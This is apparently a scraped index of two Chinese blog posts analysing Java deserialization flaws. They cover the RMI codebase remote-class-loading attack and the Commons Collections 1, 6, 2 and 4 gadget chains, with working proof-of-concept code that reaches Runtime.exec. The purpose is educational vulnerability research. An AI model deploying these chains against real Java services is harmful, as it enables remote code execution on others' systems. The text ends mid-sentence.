虽然执⾏远程⽅法的时候代码是在远程服务器上执行的，但客户端还是需要知道有哪些⽅法，这时候接口的重要性就体现了，这也是为什么我们前面要继承 Remote 并将需要调⽤的方法写在接⼝ IRemoteHelloWorld 里，因为客户端也需要⽤到这个接⼝。 通过 wireshark 抓包，观察通信过程： 整个过程进⾏了两次 TCP 握手，也就是实际建⽴了两次 TCP 连接。 第⼀次建立 TCP 连接是客户端连接服务端的 1099 端⼝，⼆者进行协商后，客户端向服务端发送了⼀个 Call 消息，服务端回复了一个 ReturnData 消息，然后客户端新建了⼀个 TCP 连接，连到远端的 51388 端口。 整个过程，⾸先客户端连接 Registry，并在其中寻找 Name 是 Hello 的对象，这个对应数据流中的 Call 消息。然后，Registry 返回一个序列化的数据，就是找到的 Name=Hello 的对象，对应数据流中的 ReturnData 消息。客户端反序列化该对象，发现该对象是⼀个远程对象，地址在 IP:port ，于是再与这个 socket 地址建⽴ TCP 连接。在新的连接中，才是真正的执行远程⽅法，也就是 hello()。 信息 RMI Registry 就像一个⽹关，其自身是不会执行远程方法的，但 RMI Server 可以在上⾯注册⼀个 Name 到对象的绑定关系。RMI Client 通过 Name 向 RMI Registry 查询，得到这个绑定关系，然后再连接 RMI Server。最后，远程方法实际上在 RMI Server 上调⽤。 ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:1:2","tags":["代码审计"],"title":"Java反序列化漏洞系列-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["代码审计"],"content":"1.3 攻击面 当攻击者可以访问目标 RMI Registry 的时候，会有哪些安全问题呢? 首先，RMI Registry 是一个远程对象管理的地方，可以理解为一个远程对象的“后台”。可以尝试直接访问“后台”功能，比如修改远程服务器上 Hello 对应的对象，但是，Java 对远程访问 RMI Registry 做了限制，只有来源地址是 localhost 的时候，才能调用 rebind、 bind、unbind 等方法。 不过，list 和 lookup 方法可以远程调用。 1.3.1 RMI 利用 codebase 执行任意代码 曾经有段时间，Java 是可以运行在浏览器中的。在使用 Applet 的时候通常需要指定一个 codebase 属性，比如： \u003capplet code=\"HelloWorld.class\" codebase=\"Applets\" width=\"800\" height=\"600\"\u003e \u003c/applet\u003e 除了Applet，RMI 中也存在远程加载的场景，也会涉及到 codebase。 codebase 是一个地址，告诉 Java 虚拟机该从哪个地方去搜索类。 如果指定 codebase=http://geekby.site/ ，然后加载 org.example.Example 类，则 Java 虚拟机会下载这个文件 http://geekby.site/org/example/Example.class ，并作为 Example 类的字节码。 RMI 的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的 CLASSPATH 下寻找相对应的类；如果在本地没有找到这个类，就会去远程加载 codebase 中的类。 如果 codebase 被控制，就可以加载恶意类。在 RMI 中，可以将 codebase 随着序列化数据一起传输的，服务器在接收到这个数据后就会去 CLASSPATH 和指定的 codebase 寻找类，由于 codebase 被控制导致任意命令执行漏洞。 官方通过如下方式解决了该安全问题： 安装并配置了 SecurityManager Java 版本低于 7u21、6u45，或者设置了java.rmi.server.useCodebaseOnly 官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在 java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java 虚拟机将只信任预先配置好的 codebase ，不再支持从 RMI 请求中获取。 通过创建 4 个文件，进行漏洞复现： ICalc.java import java.rmi.Remote; import java.rmi.RemoteException; import java.util.List; public interface ICalc extends Remote { public Integer sum(List\u003cInteger\u003e params) throws RemoteException; } Calc.java import java.rmi.RemoteException; import java.util.List; import java.rmi.server.UnicastRemoteObject; public class Calc extends UnicastRemoteObject implements ICalc { public Calc() throws RemoteException {} public Integer sum(List\u003cInteger\u003e params) throws RemoteException { Integer sum = 0; for (Integer param : params) { sum += param; } return sum; } } RemoteRMIServer.java import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RemoteRMIServer { private void start() throws Exception { if (System.getSecurityManager() == null) { System.out.println(\"setup SecurityManager\"); System.setSecurityManager(new SecurityManager()); } Calc h = new Calc(); LocateRegistry.createRegistry(1099); Naming.rebind(\"refObj\", h); } public static void main(String[] args) throws Exception { new RemoteRMIServer().start(); } } Client.policy grant { permission java.security.AllPermission; }; 编译及运行： javac *.java java -Djava.rmi.server.hostname=10.28.178.250 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer RMIClient.java： import java.rmi.Naming; import java.util.List; import java.util.ArrayList; import java.io.Serializable; public class RMIClient implements Serializable { public class Payload extends ArrayList\u003cInteger\u003e {} public void lookup() throws Exception { ICalc r = (ICalc) Naming.lookup(\"rmi://10.28.178.250:1099/refObj\"); List\u003cInteger\u003e li = new Payload(); li.add(3); li.add(4); System.out.println(r.sum(li)); } public static void main(String[] args) throws Exception { new RMIClient().lookup(); } } 这个 Client 需要在另一个位置运行，需要让 RMI Server 在本地 CLASSPATH 里找不到类，才会去加载 codebase 中的类，所以不能将 RMIClient.java 放在 RMI Server 所在的目录中。 运行 RMIClient： java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://example.com/ RMIClient 只需要编译一个恶意类，将其 class 文件放置在 Web 服务器的 /RMIClient$Payload.class 即可。 ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:1:3","tags":["代码审计"],"title":"Java反序列化漏洞系列-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["代码审计"],"content":"2 JNDI JNDI (Java Naming and Directory Interface) ，包括 Naming Service 和 Directory Service。JNDI 是 Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。 ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:2:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["代码审计"],"content":"2.1 JNDI 组成 Nameing Service 命名服务，命名服务将命名名称和对象进行关联，提供通过名称找到对象的操作 Name 名称，要在命名系统中查找对象，需要提供对象的名称 Binding 绑定，一个名称和一个对象的关链称为一个绑定 Reference 引用，在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用 上下文 上下文，一个上下文是一系列名称和对象的绑定的集合 ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:2:1","tags":["代码审计"],"title":"Java反序列化漏洞系列-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["代码审计"],"content":"参考 Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿 phith0n Java 漫谈系列 ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:3:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["代码审计"],"content":"Commons Collections 1, 2, 4, 6 Gadget 分析","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"Java 反序列化漏洞系列-2 ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:0:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"1 背景介绍 ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:1:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"1.1 Commons Collections Apache Commons 是 Apache 软件基金会的项目。Commons Collections 包为 Java 标准的 Collections API 提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。 ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:1:1","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"1.2 Java 代理 类似于 python 中装饰器的作用，Java 中的代理，就是代理类为被代理类预处理消息、过滤消息并在此之后将消息转发给被代理类，之后还能进行消息的后置处理。代理类和被代理类通常会存在关联关系，代理类本身不实现服务，而是通过调用被代理类中的方法来提供服务。 1.2.1 静态代理 创建一个接口，再创建被代理的类实现该接口并且实现该接口中的抽象方法。之后再创建一个代理类，同时使其也实现这个接口。在代理类中持有一个被代理对象的引用，而后在代理类方法中调用该对象的方法。 接口： public interface HelloInterface { void sayHello(); } 被代理类： public class Hello implements HelloInterface{ @Override public void sayHello() { System.out.println(\"Hello World!\"); } } 代理类： public class HelloProxy implements HelloInterface{ private HelloInterface helloInterface = new Hello(); @Override public void sayHello() { System.out.println(\"Before invoke sayHello\" ); helloInterface.sayHello(); System.out.println(\"After invoke sayHello\"); } } 代理类调用： public static void main(String[] args) { HelloProxy helloProxy = new HelloProxy(); helloProxy.sayHello(); } 输出： Before invoke sayHello Hello World! After invoke sayHello 使用静态代理很容易就完成了对一个类的代理操作。但是静态代理的缺点也大：由于代理只能为一个类服务，如果需要代理的类很多，那么就需要编写大量的代理类，比较繁琐。因此，提出了动态代理的概念。 1.2.2 动态代理 利用反射机制在运行时创建代理类。 接口、被代理类不变，通过构建 handler 类来实现 InvocationHandler 接口。 public class ProxyHandler implements InvocationHandler{ private Object object; public ProxyHandler(Object object){ this.object = object; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\"Before invoke \" + method.getName()); method.invoke(object, args); System.out.println(\"After invoke \" + method.getName()); return null; } } 执行动态代理： public static void main(String[] args) { System.getProperties().setProperty(\"sun.misc.ProxyGenerator.saveGeneratedFiles\", \"true\"); HelloInterface hello = new Hello(); InvocationHandler handler = new ProxyHandler(hello); HelloInterface proxyHello = (HelloInterface) Proxy.newProxyInstance(hello.getClass().getClassLoader(), hello.getClass().getInterfaces(), handler); proxyHello.sayHello(); } 输出： Before invoke sayHello Hello zhanghao! After invoke sayHello ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:1:2","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"2 CommonsCollections 1 Gadget 分析 ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:2:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"2.1 调用链 ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() MapEntry.setValue() TransformedMap.checkSetValue() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:2:1","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"2.2 POC Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"test\", \"Geekby\"); ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:2:2","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"2.3 分析 2.3.1 整体思路 cc1 gadget 的 sink 点在于 InvokerTransformer 类可以通过传入方法名，方法参数类型、方法参数，利用反射机制，进行方法调用。 反向寻找使用了 InvokerTransformer 类中 transform 方法的调用点： 发现 TransformedMap 类中的 checkSetValue 方法中调用了 transform 方法 protected Object checkSetValue(Object value) { return valueTransformer.transform(value); } 在 TransformedMap 类的成员中，发现 protected final Transformer valueTransformer 属性。通过调用该类的 decorate 方法，可以构造一个 TransformedMap 对象。 接下来去寻找调用了 checkSetValue 的 source： 在 MapEntry 中，存在 setValue 方法。因此，该链的前半段 POC 如下： 接下来就是去寻找反序列化的入口，在 AnnotationInvocationHandler 类中，重写了 readObject 方法，在该方法中，对 MapEntry 调用了 setValue 方法。 该类非公有，因此，需要通过反射来构造其对象： Class annotationClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = annotationClass.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Override.class, outerMap); 对 obj 对象进行反序列化，构成整条链的利用思路。整个过程涉及到如下几个接口和类的具体作用及一些细节如下。 2.3.2 TransformedMap TransformedMap 用于对 Java 标准数据结构 Map 做一个修饰，被修饰过的 Map 在添加新的元素时，将可以执行自定义的回调函数。如下，对 innerMap 进行修饰，传出的 outerMap 即是修饰后的 Map: MapouterMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer); 其中，keyTransformer 是处理新元素的 Key 的回调，valueTransformer 是处理新元素的 value 的回调。 我们这里所说的「回调」，并不是传统意义上的一个回调函数，而是一个实现了 Transformer 接口的类。 2.3.3 Transformer Transformer 是一个接口，它只有一个待实现的方法: TransformedMap 在转换 Map 的新元素时，就会调用 transform 方法，这个过程就类似在调用一个「回调函数」，这个回调的参数是原始对象。 2.3.4 ConstantTransformer ConstantTransformer 是实现了 Transformer 接口的一个类，它的过程就是在构造函数的时候传入一个对象: 并在 transform 方法将这个对象再返回： 2.3.5 InvokerTransformer InvokerTransformer 是实现了 Transformer 接口的一个类，这个类可以用来执行任意方法，这也是反序列化能执行任意代码的关键。 在实例化这个 InvokerTransformer 时，需要传入三个参数，第一个参数是待执行的方法名，第二个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表。 后面的回调 transform 方法，就是执行了 input 对象的 iMethodName 方法: 以执行 calc 为例： 2.3.6 ChainedTransformer ChainedTransformer 也是实现了 Transformer 接口的一个类，它的作用是将内部的多个 Transformer 串在一起。通俗来说就是，前一个回调返回的结果，作为后一个回调的参数传入。 引用 phith0n 的一张图： 2.3.7 AnnotationInvocationHandler 触发这个漏洞的核心，在于向 Map 中加入一个新的元素。在上面的 demo 中，通过手动执行 outerMap.put(\"test\", \"xxxx\"); 来触发漏洞，但在实际反序列化时，需要找到一个类，它在反序列化的 readObject 逻辑里有类似的写入操作。 在 AnnotationInvocationHandler 类中的 readObject： 核心逻辑就是 Map.Entry\u003cString, Object\u003e memberValue : memberValues.entrySet() 和 memberValue.setValue(...) 。在调用 setValue 设置值的时候就会触发 TransformedMap 里注册的 Transform，进而执行 payload。 接下来构造 POC 时，首先创建一个 AnnotationInvocationHandler： Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); Object obj = construct.newInstance(Retention.class, outerMap); 由于 sun.reflect.annotation.AnnotationInvocationHandler 是 JDK 的内部类，其构造函数是私有的，因此通过反射来创建对象。 2.3.8 进一步完善 通过构造 AnnotationInvocationHandler 类，来创建反序列化利用链的起点，用如下代码将对象序列化： ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(obj); oos.close(); 但是，在经过序列化时，抛出异常： 在本系列的第一部分描述过，java.lang.Runtime 这个类没有实现 Serializable 接口，无法序列化。因此，需要通过反射来获取当前上下文中的 java.lang.Runtime 对象。 Method m = Runtime.class.getMethod(\"getRuntime\"); Runtime r = (Runtime) m.invoke(null); r.exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"); 转换成 Transformer 的写法： Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}), }; 但是，执行过后，发现仍然没有弹出计算器。 动态调试发现与 AnnotationInvocationHandler 类的逻辑有关，在 AnnotationInvocationHandler:readObject 的逻辑中，有一个 if 语句对 var7 进行判断，只有在其不是 null 的时候才会进入里面执行 setValue，否则不会进入也就不会触发漏洞。 那么如何让这个 var7 不为 null 呢？需要如下两个条件: sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation 的子类，且其中必须含有至少一个方法，假设方法名是","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:2:3","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"3 CommonsCollections 6 Gadget 分析 ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:3:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"3.1 调用链 java.io.ObjectInputStream.readObject() java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:3:1","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"3.2 POC public class Main { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\",new Class[] { String.class }, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, new ConstantTransformer(1)); TiedMapEntry te = new TiedMapEntry(lazyMap, \"poc\"); HashSet ht = new HashSet(); ht.add(te); innerMap.remove(\"poc\"); Class c = LazyMap.class; Field f = c.getDeclaredField(\"factory\"); f.setAccessible(true); f.set(lazyMap, transformerChain); // 序列化 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(ht); oos.close(); // 反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); } } ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:3:2","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"3.3 分析 CommonsCollections 6 的 sink 链使用的依旧是 InvokerTransformer 反射接口，利用 ChainedTransformer 串联三次 InvokerTransformer 反射和 ConstantTransformer 接口，获取 Runtime 类。 在 CommonsCollections 1 中，通过交叉引用搜索到另外一个类 LazyMap 中的 get 方法调用了 transform 方法。 通过调用 LazyMap.decorate 方法，将恶意的 ChainedTransformer 赋值给 LazyMap#factory，当调用 LazyMap#get(Object key) 方法，则会触发恶意代码的执行。（与 CommonsCollections 1、CommonsCollections 5 的 sink 点相同） public static void main(String[] args) { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\",new Class[] { String.class }, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); outerMap.get(\"poc\"); } CommonsCollections 6 gadget 作者找到了 TiedMapEntry 类，其中在 TiedMapEntry#getValue() 方法中调用了 this.map.get(this.key) 方法。 public Object getValue() { return this.map.get(this.key); } 调用 TiedMapEntry(Map map, Object key) 构造方法，可以为 TiedMapEntry#map 赋值 在 TiedMapEntry 中的 equals(Object obj)、hashCode()、toString() 方法中都调用了 TiedMapEntry#getValue() 方法。这里作者选择调用 TiedMapEntry#hashCode() 方法。 接下来的思路就和 DNSURL 链类似，通过 HashMap 入口进行反序列化。 TiedMapEntry te = new TiedMapEntry(lazyMap, \"Geekby\"); te.hashCode(); 但是，在构造 HashMap 时，调用 put 方法，执行 hashcode 方法，会直接执行后续的命令执行操作，情况和 DNSURL 链相似，因此，需要通过反射来进行一些设置。 Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, new ConstantTransformer(1)); TiedMapEntry te = new TiedMapEntry(lazyMap, \"Geekby\"); HashMap\u003cObject, Object\u003e ht = new HashMap\u003c\u003e(); ht.put(te, null); // ht put 后，调用 TiedMapEntry#hashCode 中 getValue() // 调用 lazyMap#get 方法 // 判断 innerMap 中是否含有 \"Geekby\" 这个 key // 没有，进入 if 逻辑，调用 transform，向 innerMap 中添加对应的 Key:Value // 然后再删除这个键值对，便于后续反序列化再次进入 if 逻辑。 innerMap.remove(\"Geekby\"); // 此外将 LazyMap#factory 属性还原为 transformerChain （防止构造时就执行） Class c = LazyMap.class; Field factoryField = c.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(lazyMap, transformerChain); ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:3:3","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"4 CommonsCollections 2\u0026\u00264 Gadget 分析 在 2015 年底 commons-collections 反序列化利用链被提出时，Apache Commons Collections 有以下两个分支版本： commons-collections:commons-collections org.apache.commons:commons-collections4 可⻅，groupId 和 artifactId 都变了。前者是 Commons Collections 老的版本包，当时版本号是3.2.1，后者是官方在 2013 年推出的 4 版本，当时版本号是 4.0。 官方认为旧的 commons-collections 有一些架构和 API 设计上的问题，但修复这些问题，会产生大量不能向前兼容的改动。所以，commons-collections4 不再认为是一个用来替换 commons-collections 的新版本，而是一个新的包，两者的命名空间不冲突，因此可以共存在同一个项目中。 那么，既然 3.2.1 中存在反序列化利用链，那么 4.0 版本是否存在呢? ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:4:0","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"4.1 CommonsCollections4 包的改动 由于两个版本的库可以共存，因此把两个包放到同一个项目中的 pom.xml 进行比较： \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-collections\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections\u003c/artifactId\u003e \u003cversion\u003e3.2.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.commons\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections4\u003c/artifactId\u003e \u003cversion\u003e4.0\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e 用之前的 CommonsCollections6 利用链做个例子，然后将所有 import org.apache.commons.collections.* 改成 import org.apache.commons.collections4.* 。 直接运行，发现 LazyMap.decorate 这个方法没有了： 在 3 中的定义： public static Map decorate(Map map, Transformer factory) { return new LazyMap(map, factory); } 而在 6 中的定义： public static \u003cK, V\u003e LazyMap\u003cK, V\u003e lazyMap(final Map\u003cK, V\u003e map, final Factory\u003c ? extends V\u003e factory) { return new LazyMap\u003cK,V\u003e(map, factory); } 这个方法不过就是 LazyMap 构造函数的一个包装，而在 4 中其实只是改了个名字叫 lazyMap。 所以，将 Gadget 中出错的代码换一下名字： MapouterMap = LazyMap.lazyMap(innerMap, transformerChain); 运行： 同理，之前的 CC1 Gadget、CC6 Gadget，都可以在 CommonsCollections4 中正常使用。 ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:4:1","tags":["代码审计"],"title":"Java反序列化漏洞系列-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["代码审计"],"content":"4.2 PriorityQueue 利用链 ysoserial 还为 commons-collections4 准备了两条新的利用链，那就是 CommonsCollections2 和 CommonsCollections4。 commons-collections 这个包之所有能攒出那么多利用链来，除了因为其使用量大，技术上的原因是其中包含了一些可以执行任意方法的 Transformer。所以，在 commons-collections 中找 Gadget 的过程，实际上可以简化为，找一条从 Serializable#readObject() 方法到 Transformer#transform() 方法的调用链。 4.2.1 CommonsCollections2 Gadget 4.2.1.1 调用链 ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() Runtime.exec() 4.2.1.2 分析 在 CC2 中，用到的两个关键类是： java.util.PriorityQueue org.apache.commons.collections4.comparators.TransformingComparator 首先，java.util.PriorityQueue 类拥有自己的 readObject()： org.apache.commons.collections4.comparators.TransformingComparator 中有调用 transform() 方法的函数： 所以，CommonsCollections2 实际就是一条从 PriorityQueue 到 TransformingComparator 的利用链。 接下来看下这个 Gadget 的串联方式： PriorityQueue#readObject() 中调用了 heapify() 方法， heapify() 中调用了 siftDown() ， siftDown() 中调用 siftDownUsingComparator() ， siftDownUsingComparator() 中调用的 comparator.compare() ，于是就连接到上面的 TransformingComparator 了： 总结起来就是： java.util.PriorityQueue 是一个优先队列(Queue)，基于二叉堆实现，队列中每一个元素有自己的优先级，节点之间按照优先级大小排序成一棵树。 反序列化时调用 heapify() 方法，是为了反序列化后，需要恢复这个结构的顺序。 排序是靠将大的元素下移实现的。siftDown() 是将节点下移的函数， 而 comparator.compare() 用来比较两个元素大小。 TransformingComparator 实现了 java.util.Comparator 接口，这个接口用于定义两个对象如何进行比较。 siftDownUsingComparator() 中就使用这个接口的 